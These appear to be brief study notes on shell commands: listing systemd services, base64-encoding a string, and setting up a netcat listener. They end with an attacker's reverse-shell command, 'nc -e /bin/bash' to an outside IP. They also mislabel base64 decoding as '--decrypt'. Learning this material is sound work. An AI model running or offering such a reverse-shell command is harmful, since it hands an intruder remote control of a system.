+ Examples +

ls -l /etc/systemd/system /usr/lib/systemd/service | egrep .service$
--> Searches 2 paths content for possible services. I'm not sure how the $ behaves

B)
echo -n 'hereIsASecretString' | base64	--> aGVyZUlzQVNlY3JldFN0cmluZw==	--> No trailing newline (-n), --decrypt for reversing.

I am listening for connections to get a reverse shell

--> listen, noDNS, verbose, port, sourceIpOfMe

Attacker tries to attack with:
nc -e /bin/bash 123.123.123.132 22
